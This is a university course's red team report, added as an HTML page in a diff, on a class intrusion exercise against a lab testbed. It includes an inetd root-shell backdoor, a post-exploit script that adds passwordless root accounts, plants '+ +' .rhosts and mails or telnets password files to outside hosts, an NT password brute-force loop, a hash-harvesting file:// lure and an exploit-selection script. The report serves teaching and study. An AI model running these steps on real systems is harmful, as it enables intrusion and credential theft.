@@ -1,0 +1,841 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN"
+       "http://www.w3.org/TR/REC-html40/strict.dtd">
+<html>
+
+  <head>
+    <title>CS 290I Network Security and Intrusion Detection - Red Team Report</title>
+  </head>
+
+  <body>
+    <h1>Red Team Report</h1>
+
+    <h2>Team/Subgroup</h2>
+
+    <ul>
+      <li><b>team:</b>       red
+      <li><b>subgroup:</b>   exploit team
+      <li><b>code name:</b>  E squared (a.k.a. Enigmatic Enima)
+      <li><b>mission:</b>    Obtain access to the network.
+	
+    <li><p><table border="5" CELLSPACING="5" CELLPADDING="5">
+	  <tr><td colspan="3"><center><h3>Team Members</h3></center></td></tr>
+	  <tr><td>Bryce Anson (leader)</td><td>lordbored</td><td><address><a href="mailto:anson@cs.ucsb.edu">anson@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Ashish V. Thapliyal</td><td>qubit</td><td><address><a href="mailto:ashish@cs.ucsb.edu">ashish@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Changde Xiong</td><td>xiong_cd</td><td><address><a href="mailto:cdxiong@cs.ucsb.edu">cdxiong@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Xiang Fu</td><td>neverdie</td><td><address><a href="mailto:fuxiang@cs.ucsb.edu">fuxiang@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Jianyu Zhou</td><td>jianyu74</td><td><address><a href="mailto:jyzhou@cs.ucsb.edu">jyzhou@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Jingyu Zhou</td><td>minnow</td><td><address><a href="mailto:jzhou@cs.ucsb.edu">jzhou@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Andrew Mutz</td><td>andrew</td><td><address><a href="mailto:amutz@cs.ucsb.edu">amutz@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Feifei Ye</td><td>fly01</td><td><address><a href="mailto:icicle00@cs.ucsb.edu">icicle00@cs.ucsb.edu</a></address></td></tr>
+	  <tr><td>Ying Feng</td><td>cinderella</td><td><address><a href="mailto:yingf@cs.ucsb.edu">yingf@cs.ucsb.edu</a></address></td></tr>
+	</table></p>
+    </ul>
+    
+
+    <h2>Mission</h2>
+    <p>
+      We will be provided with information about the IP addresses, topology, 
+      operating systems, security holes, services, and version numbers.  
+      Given this, we are responsible for providing the escalation team with access 
+      to the network.
+    </p>
+    <h4>Responsibilities:</h4>
+    <ul>
+      <li>Bryce Anson - Coordination, scheduling, and reporting.
+      <li>Jingyu Zhou - Collection of remote Redhat exploits and backdoors.
+      <li>Ashish Thapliyal - Automation.  Communications with adjacent teams.
+      <li>Andrew Mutz - Automation (built and executed our main script).
+      <li>Feifei Ye - Collection of Linux and Solaris exploits.
+      <li>Ying Feng - Collection of Solaris exploits.  NFS.
+      <li>Jianyu Zhou - Windows NT password cracking and exploit collection.
+      <li>Changdz Xiong - Collection of remote Redhat exploits.
+      <li>Xiang Fu - Collection of remote exploits.
+    </ul>
+
+    <h2>Preparation</h2>
+    <p>
+      Jingyu collected our two functional remote exploits almost immediately.
+      Feifei had found two other remote exploits,
+      which we worked on during our first meeting, but they were unsuccessful
+      on the testbed.
+    </p><p>
+      In the next week, Jingyu examined ssh exploits.  We were unsuccessful
+      with these, because they required modifications to the ssh programs on
+      the client and/or server.  He tried installing a new client, but the 
+      installation involved many parameters and the resultant exploits were
+      unsuccessful.  We also found an excellent website with an extensive 
+      archive of exploits.  We downloaded and tested each of these on the
+      testbed, but only two of them worked.  Both were versions of the two
+      successful exploits which Jingyu had already collected.
+      We also examined and installed backdoors on the testbed.
+    </p><p>
+      In the third week, one of our members volunteered to lead our
+      Windows NT efforts.  He examined password cracking, and has been hacking
+      into the Windows NT testbed computer from his Windows NT station in the
+      Geography building.  During this time, we also examined several SunOS 5.7
+      exploits.  But, we had great difficulty with these and were unable to
+      successfully attack the Solaris computer.  Other members of our group 
+      (Ashish and Andrew) worked on scripts to automate the process.  They 
+      also included steps to obtain the password file and mail it to Maria in
+      hopes that the cracking of some passwords on the Linux boxes would allow 
+      us to access the Solaris box.  The third week also involved extra 
+      coordination with the vulnerability scanning team as well as the flag
+      acquisition team.  During the test run, the flag acquisition team's 
+      script had difficulty with the primitive TCP connection our remote
+      exploits established.  Working around this was not difficult.
+    </p><p>
+      On the day before the attack, we incorporated the script from the flag
+      acquisition team into our script.  We also received a draft version of
+      the escalation team's script, but were unable to incorporate it into
+      our own.  
+    </p>
+
+    <h4>Detailed Log of Preparation Activities:</h4>
+    <ul>
+      <li>Bryce Anson
+	<p>Focused on coordinating and reporting our efforts.
+	<ul>
+	  <li>wrote the final report.
+	  <li>wrote the weekly reports.
+	  <li>organized weekly group meetings in addition to special meetings 
+	    with the flag acquisition group, vulnerability scanning group, and
+	    our Win NT specialist.
+	  <li>sent a lot of emails.
+	  <li>collected / tuned one of the simple backdoors:
+   <pre>
+#This will append a line to inted.conf which opens port 65139 for tcp root 
+#access to anyone.
+
+/bin/echo "65139 stream tcp nowait root /bin/sh sh -i" >> /etc/inetd.conf ; 
+
+#It also kills the inted daemon so that it will be restarted with the next request.
+/bin/kill -1 inetd 2>&1 1>/dev/null ;
+
+#Finally, it emails some information about the victim.
+/sbin/ifconfig -a | mail anson@cs.ucsb.edu 2>&1 2>/dev/null
+
+   </pre>
+
+	  <li>ferried messages between various groups during "the" day.
+	</ul></p>
+
+      <li>Andrew Mutz and Ashish Thapliyal
+	<p>Wrote and executed our attacking script.  Obtained root access to
+	  every machine (but the flag team did not have enough time to acquire
+	  the flag on two of the machines).  Their script parses Nessus output
+	  from the team ahead of us, then selects one of our two successful
+	  remote exploits.  After obtaining root access, 
+	  it appends new users to the /etc/passwd file -- one is an
+	  account with login name "bdr" and password "cs290i4U".  In addition, it 
+	  emails the passwd file to Ashish.  Their script also
+	  incorporated the flag acquisition team's script, but the new accounts 
+	  allowed the flag acquisition team to work from a separate terminal.
+	  Ashish was also our ambassador to the adjacent teams.
+	</p>
+
+      <li>Jianyu Zhou
+	<p> NT password cracking.  He knew nothing at the beginning, but he soon became our NT expert.
+	  On attack day, he successfully obtained administrator access to adlon (the NT machine) and 
+	  left a note in the autoexec.bat file.
+	</p>
+
+      <li>Jingyu Zhou
+	<p>Collected and tested both of our successful remote exploits for Linux.
+	  <ul>
+	  <li>wu-ftpd
+	    <p>
+	      Sends the egg through the password. 
+	      The beauty of this remote exploit is that it works multiple times.
+	      Successful.
+	    </p>
+	  <li>rpc-statd
+	    <p>
+	      Another remote buffer overflow.  Kills the statd daemon in the
+	      process, so it can only be used once.  Successful.
+	    </p>
+	  <li>ssh
+	    <p>
+	      Patches the ssh1 client so that it can take advantage of an ssh1
+	      protocol problem.  Unsuccessful, probably due to the large number of 
+	      configuration parameters required.
+	    </p>
+	  <li>backdoors
+	    <p>
+	      Examined rootkits and several other illegal packages which he wasn't
+	      able to use on "the" day.
+	    </p>
+	</ul></p>
+
+
+      <li>Feifei Ye
+	<p>Our primary Solaris exploit collector.  Unfortunately, none were successful.
+	  <ul>
+	  <li>sadmindex.c
+	    <p>
+	    Triggers a remote buffer overflow in the sadmind server by passing the 
+	    egg to a NETMGT_PROC_SERVICE request (called via clnt_call()) and
+	    overwriting the return address.  This buffer is intended to hold
+	    the client's domain name.  The offending function is amsl_verify().
+	    It was unsuccessful on the testbed due to either an RPC timeout? 
+	    </p>
+	  <li>amountdexp.c
+	    <p>Triggers a remote buffer overflow in the automount server.  It
+	      reported that it was successful, but the commands we issued were 
+	      never executed on the victim.
+	    </p>
+	  <li>urdls.c
+	    <p>Lists files on Linux machines without having permission to do so.
+	      This program goes in a round-up (with 09-AZ-az) fashion, so it 
+	      supports start and stop points. (argument 3). It is 
+	      successful tested on the testbed.  But it requirs a local account 
+	      first, and it is very slow.
+	    </p>
+	  <li>ns-shtml.pl
+	    <p>Remote exploit for Netscape Enterprise Server 4.0 on SunOS 5.7. 
+	      Did not work on the testbed. 
+	    </p>
+	  <li>netprex.c
+	    <p>SPARC Solaris root exploit for /usr/lib/lp/bin/netpr.
+	      When the exploit is run, the 
+	      host specified with the -h option will receive a connection 
+	      from the netpr program to a nonsense printer name, but the 
+	      host will be otherwise untouched.  
+	    </p>
+	  <li>PSuser.c
+	    <p>SPARC Solaris exploit to remotely retrieve a file.
+	      It redirects the errPagePath to the file.
+	      example usage:  GET /PSUser/PSCOErrPage.htm?errPagePath=/etc/passwd\n
+	    </p>
+	</ul></p>
+
+      <li>Ying Feng
+	<p>On "the" day:  attempted to use NSF to remotely mount the file system after we acquired root access.<br>
+	  Beforehand: collected and tested remote Solaris exploits.
+	  <ul>
+	  <li>nfsbug
+	    <p>
+	      Uses a random guesses to attempt to retrieve the file handle for
+	      an NSF file.  Required some tweaking, but was successful against
+	      godard.
+	    </p>
+	  <li>rcgixploit
+	    <p>
+	      Attempts to retrieve the /etc/passwd file through HTTP.  Requires
+	      installation of scripts on the victim computer.
+	    </p>
+	  <li>sshcrc
+	    <p>
+	      Exploits crc32 of ssh.  Attempts to guess the root password through
+	      brute force.
+	    </p>
+	  <li>dmx
+	    <p>
+	      Netwin ESTMP Server v2.7q linux x86 remote exploit.  Binds a shell on TCP
+	      port 30464.  Failed due to lack of this service and an incorrect offset.
+	    </p>
+	</ul></p>
+
+      <li>Changde Xiong 
+	<p><ul>
+	  <li>Collected and tested some remote Linux exploits.
+	<ul>
+	  <li>innd
+	    <p>Remotely triggers a buffer overflow in innd 2.2.2-3.  
+	      Unsuccessful on the testbed.
+	    </p>
+	  <li>lpd
+	    <p>Linux/x86 remote root exploit for Lpr-ng v3.6.24 and below.
+	      Exploits the syslog() format string vulnerability.  Reported to 
+	      work with Redhat 7.0.  Unsuccessful on the testbed.
+	    </p>
+	  <li>bind
+	    <p>It is possible to remotely overflow a buffer handling TSIG signed queries.
+	      Reported to work with bind-8.2.2_P5.  The testbed has bind-8.2.2_P5-9.
+	      Unsuccessful on the testbed.
+	    </p>
+	</ul>
+	  <li>Practiced using John 1.6 for password cracking.
+	</ul></p>
+
+
+      <li>Xiang Fu
+	<p>tried some exploits.
+	<ul>
+	  <li>ssh1 daemon
+	    <p>Ssh1 doesn't reject multiple test on passwords.  Unsuccessful on the testbed.
+	    </p>
+	  <li>pcl
+	    <p>Tried to combine he cracking lib with ssh1, however its dictionary rule was 
+	      simple.  Unsuccessful on the testbed.
+	    </p>
+	</ul></p>
+	
+    </ul>
+
+  
+    <h2>Execution</h2>
+
+    <h4>Reports from the field:</h4>
+    <p>
+      <ul>
+      <li>report from Andrew
+<pre>
+- First, nessus output.  I ran the output of Nessus through our
+scripts.  Nessus did not give very thorough data, it only showed a
+vulnerability in 128.111.54.157.  so our scripts caught that vulnerability
+and attacked with the wsftp exploit.  The script also automatically sent
+the commands to install backdoors, email the password file to the right
+people, download and run the escalation software (even though we already
+had root) and download and run the flag acquisition script.  the results
+of that were emailed to ashish.
+
+- After that, the nessus parsing script was not used, but the automated
+backdoor, password file, escalation and acquisition script was.
+
+-The only exploit that I successfully used was the wsftp exploit.  the
+machines we used it successfully on were:
+128.111.54.157(altman)
+128.111.54.10 (mamet)
+128.111.54.70 (coppola)
+128.111.54.21 (leone)
+in that order.
+
+-the automated scripts seemd to fail on 70 and 21.  Not sure, but I think
+this had to do with some problem with the /tmp directory that we were  
+using to store our files.  root was acquired by hand on 21 (ashish
+handled 70, I think by hand).  10 fell pretty quickly, but I forget the
+details unfortunately (I think it was piping the scripts to a hand-run
+wsftp exploit).
+
+
+      <li>report from Jianyu (NT break-in)
+<hr><p>
+The first thing in our mind is that a remote intruder is nothing but 
+Administrator. However, NT does not (by default) provide the capacity to 
+execute commands remotely, and even it did, interative log on to NT server 
+is restricted to a administrative accounts, severely limiting the ability of 
+remote (non-Admin) users to do damage. 
+</p><p>
+Thus, one of the most primary machanism for gaining Administrator priviliage 
+is to guessing passwords. Usually the NetBIOS Session service TCP 139 is 
+availableon a NT installed on defaults. The most effective method for 
+breaking into NT is good, old fashioned, remote password guesing: attempting 
+to connect to an enumerated share and trying username/passwrod combination 
+until you find one that works.
+</p><p>
+Finding an appropriate share point to attack is trivial. The Interprocess 
+Communication "share" (IPC$) that is invariably present on systems exporting 
+TCP 139.In addition, the default administrative shars including ADMIN$ AND 
+{%systemdrive%]$ (e.g., c$), are also almost always present to enable password guessing.
+Password guessing can be carried out via the command line, using the net use command.  
+Specifying an asterisk(*) instead of a password causes the remote system to 
+prompt for one as show:
+<pre>
+C:\> net use \\128.111.54.40\IPC$ * /user:Administrator
+Type the password for \\128.111.54.40\IPC$:
+</pre><p>
+Note password guessing is the most surgical when it leverages age-old user 
+password selection errors. Usually users tend to choose the easiest password 
+possible--i.e. no password. Or they choose something that is easy to remember, 
+like their username or their first name. Also a lot of popular software runs 
+under the context of an NT user account.These account names generally become 
+public knowledge over time, ane even worse, are generally set to something 
+memorable.
+</p><p>
+Password guessing can be performed automatically. We may simply whip up a loop 
+using the NT shell FOR command based on the standard NET USE syntax. First 
+create a simple username and password file based on the high probability 
+combination. Such a file might look something like the following:
+<pre>
+[file:credentials.txt]
+paasword username
+admin	Administrator
+secret	Administrator
+etc....
+</pre>
+Then we can feed this file to our FOR command like so:
+<pre>
+C:\> FOR /F "tokens=1,2*" %i in (credentials.txt) do net use \\128.111.54.40\IPC$ %i /u:%j
+</pre><p>
+Many dedicated software programs that automate password guessing. Legion and 
+NetBIOS Auduiting Tool(NAT). Legion can scan multiple class C IP address 
+ranges from Windows shares and also offers a manual dictionary attack too.
+NAT perofmrs a similar function, albeit one target at a time. It operates 
+from the command line. NAT will connect to a target system and then attempt 
+to guess passwords from a predefined array and user-supplied lists.
+</p><p>
+Another good tool is from Network Associates Inc.'s (NAI), their products 
+CyberCop Scanner comes with a utility called SMBGrind that is extremely fast, 
+because it can set up multiple grinders running in parallel. But the tool is 
+a commercial product. Obviously we have no budget for it.
+</p><p>
+Password guessing is hard work. The other way is to sniff credentials off the 
+wrie as users log in to a server and then replay them to gain access. This 
+approach can spare a lot of random guesswork. L0phtcarck available at 
+http://www.l0pht.com can do this job. L0 phtcrack is an NT password-guessing 
+tool that usually works offline against a captured NT password database.  It 
+also includes a function called SMB Packet Capture that bypasses the need the 
+capture the password file. SMB Packet Capture listens to the local network 
+segment and captures the individual login sessions between NT systems, strips 
+out the hashed password information, and reverse-engineers the standard NT 
+one-way function. The effectiveness of th reverse-engineering applied by SMB 
+caputure with the main L0phtcrack password-cracking engine is such that 
+anyone who can sniff the wire for extended periods is most certainly 
+guaranteed to obtain Administrator status in a matter of days.
+</p><p>
+Here is one way of using social engineering to get the password hash.  Just 
+send out an email to our target. whether it is an individual or a company.  
+Include in it a URL in the form of 
+<pre>
+file:////yourcomputer/sharename/message.html
+</pre> 
+
+When people click that URL they will be sending their password hashes to you 
+for authentication.
+</p><p>
+Another novel thought is: if one somehow came into possession of a valid use 
+password hash value (say from an SMB capture session or a captured NT SAM 
+file), he maybe use them in a normal respnose to a logon challenge. Then he 
+could log on to a server without knowledge of a viable password, just a user 
+name and corresponding password hash value. A paper discussing the technical 
+details of passing the hash writtern by CORE-SDI's Hernan Ochoa is available
+ at http://www.core-sdi.com/papers/nt_cred.htm.
+</p><p>
+We examined privilege escalation as a byproduct of remote access searching.  
+If intruders find a non-Admin user account, their may locally by using some 
+tools escalates to get Administrator's privileges. 
+</p><p>
+Getadmin is a small program written by Knostantin Sobolev that adds a user 
+to the local Administrator groups. It uses a low-level NT kernel routine to 
+set a global flag allowing access to any running process, then uses a 
+technique called DLL injection to insert malicious code into a process that 
+has the privileges to add users to the Administrator group.
+</p>
+
+<b>Execution</b>
+<pre>
+nbstat command is used to check if NetBIOS sesion port is on. 
+c:\>nbtstat -A 128.111.54.40
+
+It turns out not very efficient. We turns to use Cerberus Internet Scanner (CIS) to search for existing window NT vulnerabilities. We got several valid usernames for NetBIOS service, Administrator, Guest... Besides NetBIOS port (139) is on, There are a few default IIS web pages with vulnerabilities there. We first try password guessing use net use command to connect to the machine 128.111.54.40, attempting to log on as Administrator.
+C:\> net use \\128.111.54.40\IPC$ * /user:Administrator
+
+NAT was used to automate the password guessing process. It uses its default password file and account name file for brute-force dictionary password guessing. We failed this running. We also most gave up.
+Somehow, we tried to use cs290i4U as password to log on remotely a Administrator, it turns out to be a success. We successfuly completed an IPC$ connection to the remote machine. Then we tried to see if there are any share available using the net command:
+C:\> net view \\128.111.54.40
+
+There is one share NETLOGON available. We connected to it using the net command
+C:\> net use x: \\128.111.54.40\NETLOGON
+
+Using the next command, we map the remote c drive as a local drive g.
+c:\> net use g: \\128.111.54.40\c$
+
+Once we have gained access to the C$ share, we typed 
+C:\> dir g: /p 
+to view the content on the drive.
+</pre>
+<p>
+This new drive also shows up as an icon in mycomputer window. So we can 
+browse through it just by clicking it.
+</p><p>
+We left two word files in the remote machine with the content redteam has 
+been here. Also changed the content of autoexe.bat file by adding a line 
+"readteam has been here". The attack screen shot was printed out from the 
+printer in the NT lab on the first floor.
+</p><p>
+We also tried to use the downloaded l0phtcrack program for caputuring SMB 
+hash interchange on local network. But failed. Either because the machine we 
+are working on don't have an ethernet card or our privilege level didn't 
+allow me to do that.
+</p><p>
+during the attacking process, multiple exploits from the following section 
+was downloaded and tested against the remote host. 
+</p>
+      <li>report from Bryce
+
+<pre>      
+I was not able to show up early, since I had a class beforehand.  When I 
+arrived, our NT expert informed me that he wouldn't be able to work from
+the Geography lab (his previous hacking station) because a class was being
+taught in it.  So, Giovanni asked the sys. admin for yet another favor, and 
+he provided Jianyu with temporary adminstrator access to an NT machine in 
+the NT lab.  Next, I grabbed a member of our team (Changde) and sent him to 
+help Jianyu in that lab.  
+
+When I returned, things were still very slow and congested, and Ashish and 
+Andrew were too busy to be bothered.  So, I talked to some other members of my
+group.  They wanted something to do, so I told them they could go ahead and 
+try to break into godard, but they should not touch the Linux boxes.  I also 
+talked with the leader of the flag acquisition team about his "social-
+engineering" attack which had obtained the location of the flag on the NT 
+machine.  This was good, since we had no good mechanism to help us search for 
+the flag on the NT machine.  But, we weren't sure if this "attack" was 
+completely legitimate, so we hoped that Jianyu would be able to break into 
+the NT box in order to support it.
+
+Next, I was given the duty of recording information about compromised machines.
+This was difficult, because the people who had the best idea of what was going
+on were also the most innundated with questions from other people who wanted to
+know what was going on.  Also, after I collected some information, people
+grabbed my sheet.  So, I took several sheets of paper from the printer and 
+made several copies of information about the IP addresses, which machines
+we had root on, which machines we had flags from, what accounts and passwords
+we had cracked, and the username and password we had installed on the 
+compromised machines.  I gave these sheets to our NT guy, Jingyu, two members 
+of the flag team, and one member from the exploit team.
+
+After distributing these papers, I made my rounds to visit each of these
+people and update their information.  During this, one member of the flag
+team was unable to login to one of the hosts (coppola) which we had already 
+comprimised.  We didn't yet have the flag from this host, so I reported this 
+to Ashish and he began to work on getting back in through
+the various passwords he had installed on that host.  Unfortunately, they 
+didn't work and our backdoors hadn't been installed on that host.  So, he ran
+our remote exploit again.  The remote ftp exploit was still successful,
+but we ran out of time before the flag team could find the flag on that host.
+
+
+This was my final report.
+
+altman	128.111.54.157		R,F
+mamet	          .10		R,F
+leone             .20 --> 21	R,F
+adlon (NT)	  .40		R,F
+godard (Solaris)  .50		R
+copolla		  .70		R
+</pre>
+      </ul>
+    </p>
+
+
+    
+    <h2>Evaluation</h2>
+
+    <h4>The Attack:</h4>
+    <p>
+      During our trial run, it was clear that inter-group communication was
+      the primary weakness of the Red team.  Intra-group communication was
+      better, but it was still difficult.  The trial run alerted our team to
+      the need for improved coordination between our group and the flag
+      acquisition team, so we worked harder during the weekend to coordinate 
+      with this and the vulnerability scanning group.  
+      On attack day, Ashish and Andrew stationed themselves in the
+      thick of it (next to a representative from the topology team), but the 
+      flag team seemed unable to squeeze a representative into this highly 
+      congested area.
+    </p><p>
+      Giovanni bribed the system administrator into providing us with temporary
+      administration privledges on a Windows NT machine in the graduate NT lab.
+      Our NT expert began downloading his programs.
+    </p><p>
+      The attack began with a very effective denial of service attack by the
+      Red team against itself.  Congestion crippled the network almost as badly
+      as it clogged the walkways.  Communication was difficult.  Many people
+      had no idea what was going on, and Ashish and Andrew were continually
+      bombarded with update queries from members of our group and other groups.
+    </p>
+
+    <h4>Suggestions for future improvements:</h4>
+    <p>
+      I think that the attack may have been more successful if each team had
+      sent only 1-3 representatives.  Andrew, Ashish, and Jianyu (for Windows
+      NT) were enough from our group.  Bandwidth and network instability 
+      seemed to be a problem for the flag acquisition team, and subtlety was 
+      hopelessly lost.
+    </p><p>
+      A designated messanger might have been useful.  Email was the primary
+      form of contact before the attack, but 
+      paper messages seemed to work much better during the attack. 
+    </p><p>
+      A different group structure may have helped.  One issue is streamlining, 
+      since, even if each group
+      sent only 3 representatives, communication would be difficult with 
+      18 representatives from 6 different groups.  Another issue was task 
+      overlap.  Our
+      group found remote access exploits which obtained root
+      access immediately.  Also, we encountered many escalation exploits while
+      hunting for Redhat 6.2 remote access exploits.  So, it seems that
+      remote access and escalation on a single platform should be handled by a
+      single group.
+    </p><p>
+      I would suggest the following division of groups:
+    <ul>
+      <li>Scanning (2)
+      <li>Solaris exploit (2)
+      <li>Linux exploit   (3)
+      <li>NT scanning, exploit, and flag acquisition (3)
+      <li>Solaris and Linux flag acquisition (2)
+      <li>Automation / Management (5)
+    </ul>
+    Under this division, the automation team would be the only group to
+    have control of the network during the attack.  They would have one
+    or two members in each of the other groups.  These members would attend
+    the meetings of both groups.  So, the automation team sits in the middle
+    of a three-level group hierarchy (where the Dan group is the root).  They 
+    would combine 
+    the results from each of the other groups and prepare a consistent set of 
+    scripts for the attack.
+  </p><p>
+      On attack day, a slightly different group structure could be defined.
+      This structure might include one person in charge of communications.
+      It might also include a backup group which would be available to handle
+      unplanned events as they arise.
+    </p>
+
+    <h2>Miscellaneous</h2>
+
+    <h4>A-day scripts:</h4>
+    These are the scripts we used on attack day.
+    <ul>
+      <li>
+<pre>
+echo '+ +' > /tmp/.rhosts        
+cp /tmp/.rhosts /root/.rhosts
+cp /tmp/.rhosts /home/* 
+echo 'bdr:jIQJyK22Ct3M2:0:0:bdr:/root:/bin/bash' >> /etc/passwd
+echo 'bd::0:0:bd:/root:/bin/bash' >> /etc/passwd
+echo 'bdu:jIQJyK22Ct3M2:12345:100:bdu:/home:/bin/sh'>> /etc/passwd
+echo 'bdu1::12346:100:bdu1:/home:/bin/sh'>> /etc/passwd
+sed s/'*'// /etc/passwd > /tmp/temp123
+sed s/'x'// /tmp/temp123 > /etc/passwd
+
+ifconfig -a > /tmp/.passwd
+cat /etc/passwd >> /tmp/.passwd
+mail ashish@cs.ucsb.edu < /tmp/.passwd
+mail mariabar@cs.ucsb.edu < /tmp/.passwd
+
+cd /tmp
+
+printf "user ashish Road1To2\ncd cs290iv/RedTeam/Vuln-Exploit\nget XMEN.tar\nget fs3.pl\nbye\n" | ftp -n miles
+printf "user ashish Road1To2\ncd cs290iv/RedTeam/Vuln-Exploit\npassive\nget XMEN.tar\nget fs3.pl\nbye\n" | ftp -n miles 1> /dev/null
+tar xf XMEN.tar
+
+cp fs3.pl /tmp/fs3.old
+ifconfig -a > /tmp/.secret
+printf "(/usr/bin/perl /tmp/fs3.pl >>/tmp/.secret ) || (/usr/local/bin/perl  /tmp/fs3.pl >> /tmp/.secret)\nmail ashish@cs.ucsb.edu</tmp/.secret" | ./escalate.sh
+
+telnet packard 12345 < /tmp/.passwd
+</pre>
+      <li>
+<pre>
+#!/bin/perl
+
+
+##config stuff...
+
+$workFile = "./work";
+
+my %targets;
+my $currentParsingIP;
+while(<>){
+  if (m/^[^\:]+\:[^\:]+\:[^\:]+\:[^\:]+\:[^\:]+\:[^\:\t]+\t+(\d+\.\d+\.\d+\.\d+)\t+([^\t]+)/){
+    my ($ip, $os, $version) = ($1, $2, $3);
+    $targets{$ip}{'os'} = $os;
+    $targets{$ip}{'osVersion'} = $version;
+  }
+
+  if (m/^\+ (\w+) \:/){ $currentParsingIP = lookupIP($1); }
+  if (m/^\+ (\d+\.\d+\.\d+\.\d+) \:/){ $currentParsingIP = $1; }
+
+  if (m/^ \. Vulnerability found on port (.*) \((\d+)\/(\w+)\) :/){
+    $targets{$currentParsingIP}{$3}{$2} = $1;
+  }
+  if (m/^   o (\w+) \((\d+)\/(\w+)\)/){
+    $targets{$currentParsingIP}{$3}{$2} = $1;
+  }
+}
+
+
+
+##okay, now that we have a pretty hash, let's just do some rules...
+foreach my $k1 (keys %targets){
+#  print "\ttrying $k1\n";
+  my $attacked = 0;
+  if ($k1 eq lookupIP('truffault.cs.ucsb.edu')){
+    print "skipping truffault...\n";
+    next;
+  }
+  foreach my $k2 (keys %{ $targets{$k1} }){
+#  print "\t\ttrying $k2\n";
+    if (($k2 eq 'tcp')||($k2 eq 'udp')){
+      foreach my $k3 (keys %{ $targets{$k1}{$k2} }){
+#	print "\t\t\ttrying $k3\n";
+	my ($ip, $protocol, $port, $os, $version) = 
+	  ($k1, $k2, $k3, $targets{$k1}{'os'},$targets{$k1}{'osVersion'});
+	print "machine:  $os\/$version $ip $protocol\/$port...\n";
+
+	if (   (!($os =~m/NT/))&&(!($os =~m/Solaris/))
+	    && ($protocol eq 'tcp')
+	    && ($port eq 21)
+           ){
+	  $attacked = 1;
+	  print "\texecuting bobek on $ip\n";
+#	  my $command = "./bobek -t 7 $ip";
+	  my $command = "cat";
+	  runAndDoWork($command);
+	}
+	if ( (!($os =~m/NT/))&&(!($os =~m/Solaris/))
+	    && ($protocol eq 'udp')
+           ){
+	  print "\texecuting statd on $ip\n";
+	  my $command = "cat";
+#	  my $command = "./statdx -d 0";
+	  runAndDoWork($command);
+	  $attacked = 1;
+	}
+
+	if(!($attacked cmp 0)){
+	  print "\n***You'll need to attack ".$ip." by hand.  os:".$targets{$k2}{'os'}." prot:".$protocol."[$attacked] port:".$port."\n";
+	}
+      }
+    }
+  }
+}
+
+dump_hash();
+
+
+sub runAndDoWork($){
+  my ($command) = @_;
+  $actualCommand = $command." < ".$workFile;
+  system($actualCommand);
+}
+  
+
+sub lookupIP($){
+  my ($host) = @_;
+  my $nslOutput = `nslookup $host`;
+  my $result;
+  my @addresses = ($nslOutput =~ m/\d+\.\d+\.\d+\.\d+/g);
+  foreach my $addr (@addresses){$result = $addr;}
+  return $result;
+}
+
+sub dump_hash(){
+  foreach my $ip (keys %targets){
+    foreach my $k1 (keys %{ $targets{$ip} }){
+      if (($k1 eq 'tcp')||($k1 eq 'udp')){
+	foreach my $k2 (keys %{ $targets{$ip}{$k1} }){
+	  print "$ip\t$k1\t$k2\t".$targets{$ip}{$k1}{$k2}."\n";
+	}
+      }else{
+	print "$ip\t$k1\t".$targets{$ip}{$k1}."\n";
+      }
+    }
+  }
+}
+</pre>
+    </ul>
+
+    <h2>References</h2>
+
+    <h4>Successful remote exploits for Redhat 6.2:</h4>
+    <ul>
+      <li>wu-ftpd
+	<a href="http://www.securityfocus.com/vdb/bottom.html?vid=1387">http://www.securityfocus.com/vdb/bottom.html?vid=1387</a>
+      <li>rpc-statd
+	<a href="http://www.securityfocus.com/vdb/bottom.html?vid=1480">http://www.securityfocus.com/vdb/bottom.html?vid=1480</a>
+    </ul>
+
+    <h4>Remote exploits for Redhat (unsuccessful on the testbed):</h4>
+    <ul>
+      <li>innd 2.2.2-3 remote buffer overflow 
+	<a href="http://www.self-evident.com/security/daemons/innd/inndx.c">
+	  http://www.self-evident.com/security/daemons/innd/inndx.c</a>
+      <li>lpd - exploit of the syslog() format string vulnerability
+	<a href="http://packetstorm.securify.com/0012-exploits/">
+	  http://packetstorm.securify.com/0012-exploits</a>
+      <li>bind - remote buffer overflow of the buffer for handling TSIG signed queries.
+	<a href="http://www.isc.org/products/BIND/bind-security.html">
+	  http://www.isc.org/products/BIND/bind-security.html</a>
+      <li>ssh1 daemon
+	<a href="http://www.securityfocus.com/frames/?content=/vdb/bottom.html%3Fvid%3D2345">http://www.securityfocus.com/frames/?content=/vdb/bottom.html%3Fvid%3D2345</a>
+      <li>pcl
+	<a href="http://www.password-crackers.com/pcl.html">http://www.password-crackers.com/pcl.html</a>
+    </ul>
+
+    <h4>Remote exploits for Solaris (unsuccessful on the testbed):</h4>
+    <ul>
+      <li>sadmind
+      <a href="http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html">
+	http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html</a>
+      <li>automount
+      <a href="http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html">
+	http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html</a>
+      <li>PSuser.c
+      <a href="http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html">
+	http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html</a>
+      <li>Netscape Enterprise Server
+      <a href="http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html">
+	http://darknet.securityinfos.com/exploits/os/solaris/sparc/7.0/index.html</a>
+      <li>nfsbug
+      <a href="www.securityfocus.com/tools/431">www.securityfocus.com/tools/431</a>
+      <li>rcgixploit
+	<a href="http://www.AntiOnline.com/cgi-bin/anticode/file.pl?file=win-exploits/rcgixploit.
+c.txt">http://www.AntiOnline.com/cgi-bin/anticode/file.pl?file=win-exploits/rcgixploit.
+c.txt</a>
+      <li>dmx
+	<a href="http://www.AntiOnline.com/cgi-bin/anticode/file.pl?file=linux-exploits/dmx.c">
+	  http://www.AntiOnline.com/cgi-bin/anticode/file.pl?file=linux-exploits/dmx.c</a>
+    </ul>
+
+    <a name="NTlinks">
+    <h4>Windows NT hacking software and links:</h4>
+    <ul>
+      <li>Legion <a href="ftp://ftp.technotronic.com/rhino9-products/legion.zip">
+	  ftp://ftp.technotronic.com/rhino9-products/legion.zip</a>
+
